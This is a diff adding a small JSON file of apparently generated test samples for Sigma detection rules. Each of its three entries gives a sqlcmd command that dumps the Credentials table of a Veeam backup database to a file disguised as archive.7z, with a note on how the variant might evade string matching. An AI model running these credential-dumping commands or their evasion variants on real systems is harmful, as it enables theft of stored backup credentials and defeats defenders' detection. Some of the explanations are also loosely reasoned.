@@ -1,0 +1,14 @@
+[
+  {
+    "output": "sqlcmd -S localhost -U testuser -P testpass -Q \"SELECT TOP 1 * FROM [VeeamBackup].[dbo].[Credentials]\" -o \"C:\\Lab\\out\\archive.7z\"",
+    "explanation": "Reordering: The command reorders the arguments to avoid the suspicious sequence of keywords in the CommandLine field, potentially evading the Sigma rule's string match."
+  },
+  {
+    "output": "sqlcmd -S localhost -U testuser -P testpass -Q \"SELECT TOP 1 * FROM [VeeamBackup].[dbo].[Credentials]\" -b -o \"C:\\Lab\\out\\archive.7z\"",
+    "explanation": "Insertion: Added the -b flag to the command line, which may change how the CommandLine field is parsed and may avoid matching the Sigma rule's string pattern."
+  },
+  {
+    "output": "sqlcmd -S localhost -U testuser -P testpass -Q \"SELECT TOP 1 * FROM [VeeamBackup].[dbo].[Credentials]\" -o \"C:\\Lab\\out\\archive.7z\" -W",
+    "explanation": "Substitution: Replaced the default option with -W (which sets the width of the output), altering the CommandLine field's structure and potentially avoiding the Sigma rule's detection."
+  }
+]
